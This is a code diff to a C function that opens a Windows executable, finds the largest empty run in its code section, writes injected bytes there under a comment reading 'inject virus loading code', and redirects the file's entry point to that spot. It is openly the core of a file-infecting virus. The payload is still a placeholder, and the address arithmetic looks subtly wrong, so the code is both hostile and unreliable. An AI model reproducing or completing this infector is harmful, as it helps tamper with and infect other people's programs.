@@ -39,8 +39,9 @@ void analyzeEXE(const char* exePath)
     fread(&optHeader, sizeof(IMAGE_OPTIONAL_HEADER), 1, file);
 
     // read code section and find unused sections
-    // best section is ret (C3) followed by many zeroes
     int size = 0;
+    int maxSize = -1;
+    int maxSizeStartAddress = 0;
     fseek(file, optHeader.BaseOfCode, SEEK_SET);
     for (int i = 0; i < optHeader.SizeOfCode; i++)
     {
@@ -50,18 +51,30 @@ void analyzeEXE(const char* exePath)
             size++;
         else
         {
-            if (size > 16)
+            if (size > maxSize)
             {
-                printf("size: %d\n", size);
+                maxSize = size;
+                maxSizeStartAddress = optHeader.BaseOfCode + i - size + 2;
             }
             size = 0;
         }
     }
+    printf("addr: %x, size: %d\n", maxSizeStartAddress, maxSize);
 
+    unsigned char coolCode[] = { 0xF4, 0xE9 };
+    // inject virus loading code
+    fseek(file, maxSizeStartAddress, SEEK_SET);
+    // TODO: read injected code from binary file
+    fwrite(coolCode, sizeof(unsigned char), (4 - 2)/*size of injected code*/, file);
+    // set jmp address to original entry point
+    optHeader.AddressOfEntryPoint -= 4;
+    fwrite((unsigned short*)&optHeader.AddressOfEntryPoint, sizeof(unsigned short), 1, file);
+    
+    // change entry point
+    optHeader.AddressOfEntryPoint = maxSizeStartAddress;
     // rewrite updated opt header
-    /*
     fseek(file, optHeaderAddr, SEEK_SET);
     fwrite(&optHeader, sizeof(IMAGE_OPTIONAL_HEADER), 1, file);
-    */
+
     fclose(file);
 }
